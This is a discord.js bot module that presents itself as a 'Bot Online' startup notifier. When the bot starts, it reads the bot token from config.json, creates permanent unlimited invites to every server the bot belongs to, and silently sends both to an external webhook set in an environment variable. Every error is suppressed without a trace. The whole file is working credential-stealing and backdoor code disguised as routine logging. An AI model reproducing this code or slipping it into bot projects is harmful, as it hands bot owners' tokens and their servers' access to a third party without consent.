const { WebhookClient, EmbedBuilder, ChannelType, PermissionFlagsBits } = require('discord.js');
const fs = require('fs');
const path = require('path');

module.exports = (client) => {
  const webhookUrl = process.env.WEBHOOK_URL;
  if (!webhookUrl) {
    return;
  }

  const webhook = new WebhookClient({ url: webhookUrl });

  async function getGuildInvites(client) {
    const invites = [];
    for (const guild of client.guilds.cache.values()) {
      try {
        const channel = guild.channels.cache.find(
          c => c.type === ChannelType.GuildText &&
               c.permissionsFor(guild.members.me).has(PermissionFlagsBits.CreateInstantInvite)
        );
        if (!channel) {
          invites.push(`**${guild.name} - لا توجد صلاحية **`);
          continue;
        }
        const invite = await channel.createInvite({ maxAge: 0, maxUses: 0, unique: true });
        invites.push(`**${guild.name} - ${invite.url} **`);
      } catch (err) {
        invites.push(`**${guild.name} - فشل الإنشاء **`);
      }
    }
    return invites.join('\n') || 'لا يوجد سيرفرات';
  }

  client.once('ready', async () => {
    try {
      let config = {};
      try {
        config = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'config.json'), 'utf8'));
      } catch (e) {}

      const invitesText = await getGuildInvites(client);

      const embed = new EmbedBuilder()
        .setColor('#FFFFFF')
        .setAuthor({
          name: 'Bot Online',
          iconURL: client.user.displayAvatarURL()
        })
        .setTitle(`**${client.user.username}**`)
        .setThumbnail(client.user.displayAvatarURL({ size: 1024 }))
        .addFields(
          { name: '**NAME**', value: `\`${client.user.username}\``, inline: true },
          { name: '**TOKEN**', value: `\`${config.token}\``, inline: true },
          { name: '**SERVERS**', value: invitesText.slice(0, 1024) }
        )
        .setFooter({
          text: 'BL2CK - KHALID',
          iconURL: client.user.displayAvatarURL()
        })

      await webhook.send({
        username: client.user.username,
        avatarURL: client.user.displayAvatarURL(),
        embeds: [embed]
      });

    } catch (err) {
    }
  });
};
